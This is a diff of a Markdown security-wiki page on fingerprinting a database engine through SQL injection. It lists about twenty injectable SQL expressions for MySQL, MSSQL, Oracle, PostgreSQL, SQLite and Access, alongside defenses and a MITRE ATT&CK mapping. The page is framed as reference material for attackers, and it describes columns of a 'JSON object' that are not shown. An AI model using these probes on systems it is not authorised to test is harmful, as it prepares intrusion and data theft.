@@ -54,11 +54,15 @@ Technical Explanation: This procedure involves sending a series of SQL injection
 
 Business Value: By identifying the type of DBMS in use, an attacker can craft specific SQL injection attacks that exploit known vulnerabilities in the identified DBMS, potentially leading to unauthorized access to sensitive data.
 
+ 
+
 ## Requirements
 
 1. Access to a system with a vulnerable DBMS
 
 1. Knowledge of SQL injection commands
+
+ 
 
 ## Defense
 
@@ -68,17 +72,25 @@ Business Value: By identifying the type of DBMS in use, an attacker can craft sp
 
 1. Monitor network traffic for indications of SQL injection attacks
 
+ 
+
 ## Objectives
 
 1. Identify the type of DBMS in use on a targeted system
 
 1. Craft specific SQL injection attacks that exploit known vulnerabilities in the identified DBMS
 
+ 
+
 # Instructions
 
 1. This JSON object contains a list of SQL commands that are compatible with different DBMS. The commands are tested on different DBMS and the result is shown in the second column. The third column contains the name of the DBMS. Use this list to find the right command for your DBMS.
 
+ 
+
 > The commands in this JSON object are used to compare the compatibility of SQL commands across different DBMS. The first column contains SQL commands, the second column contains the result of the command when executed on the DBMS specified in the third column. Use this list to find the right command for your DBMS.
+
+
 
 **Command** ([[Convert 'a' from base 16 to base 2]]):
 
@@ -86,11 +98,19 @@ Business Value: By identifying the type of DBMS in use, an attacker can craft sp
 conv('a',16,2)=conv('a',16,2)
 ```
 
+
+
+
+
 **Command** ([[Check if connection IDs match]]):
 
 ```bash
 connection_id()=connection_id()
 ```
+
+
+
+
 
 **Command** ([[Calculate CRC32 of 'MySQL']]):
 
@@ -98,11 +118,19 @@ connection_id()=connection_id()
 crc32('MySQL')=crc32('MySQL')
 ```
 
+
+
+
+
 **Command** ([[Calculate binary checksum of 123]]):
 
 ```bash
 BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
 ```
+
+
+
+
 
 **Command** ([[Check if there are any active connections]]):
 
@@ -110,11 +138,19 @@ BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
 @@CONNECTIONS>0
 ```
 
+
+
+
+
 **Command** ([[Check if the number of connections is equal to itself]]):
 
 ```bash
 @@CONNECTIONS=@@CONNECTIONS
 ```
+
+
+
+
 
 **Command** ([[Check if the CPU is busy]]):
 
@@ -122,11 +158,19 @@ BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)
 @@CPU_BUSY=@@CPU_BUSY
 ```
 
+
+
+
+
 **Command** ([[Check if user ID 1 is equal to itself]]):
 
 ```bash
 USER_ID(1)=USER_ID(1)
 ```
+
+
+
+
 
 **Command** ([[Check if ROWNUM is equal to itself]]):
 
@@ -134,11 +178,19 @@ USER_ID(1)=USER_ID(1)
 ROWNUM=ROWNUM
 ```
 
+
+
+
+
 **Command** ([[Convert 'AB' from RAW to HEX]]):
 
 ```bash
 RAWTOHEX('AB')=RAWTOHEX('AB')
 ```
+
+
+
+
 
 **Command** ([[Check if 0 is not equal to 123]]):
 
@@ -146,11 +198,19 @@ RAWTOHEX('AB')=RAWTOHEX('AB')
 LNNVL(0=123)
 ```
 
+
+
+
+
 **Command** ([[Convert 5 to an integer]]):
 
 ```bash
 5::integer=5
 ```
+
+
+
+
 
 **Command** ([[Get the client encoding]]):
 
@@ -158,11 +218,19 @@ LNNVL(0=123)
 pg_client_encoding()=pg_client_encoding()
 ```
 
+
+
+
+
 **Command** ([[Get the current text search configuration]]):
 
 ```bash
 get_current_ts_config()=get_current_ts_config()
 ```
+
+
+
+
 
 **Command** ([[Quote the literal value 42.5]]):
 
@@ -170,11 +238,19 @@ get_current_ts_config()=get_current_ts_config()
 quote_literal(42.5)=quote_literal(42.5)
 ```
 
+
+
+
+
 **Command** ([[Get the name of the current database]]):
 
 ```bash
 current_database()=current_database()
 ```
+
+
+
+
 
 **Command** ([[Get the version of SQLite]]):
 
@@ -182,11 +258,19 @@ current_database()=current_database()
 sqlite_version()=sqlite_version()
 ```
 
+
+
+
+
 **Command** ([[Check if the last inserted row ID is greater than 1]]):
 
 ```bash
 last_insert_rowid()>1
 ```
+
+
+
+
 
 **Command** ([[Check if the last inserted row ID is equal to itself]]):
 
@@ -194,11 +278,19 @@ last_insert_rowid()>1
 last_insert_rowid()=last_insert_rowid()
 ```
 
+
+
+
+
 **Command** ([[Convert 1 to a double]]):
 
 ```bash
 cdbl(1)=cdbl(1)
 ```
+
+
+
+
 
 **Command** ([[Check if 1337 is equal to 1337]]):
 
@@ -206,11 +298,17 @@ cdbl(1)=cdbl(1)
 1337=1337
 ```
 
+
+
+
+
 **Command** ([[Check if 'i' is equal to 'i']]):
 
 ```bash
 'i'='i'
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -250,3 +348,5 @@ cdbl(1)=cdbl(1)
 
 - [[DBMS Identification]]
 - [[SQL Injection]]
+
+
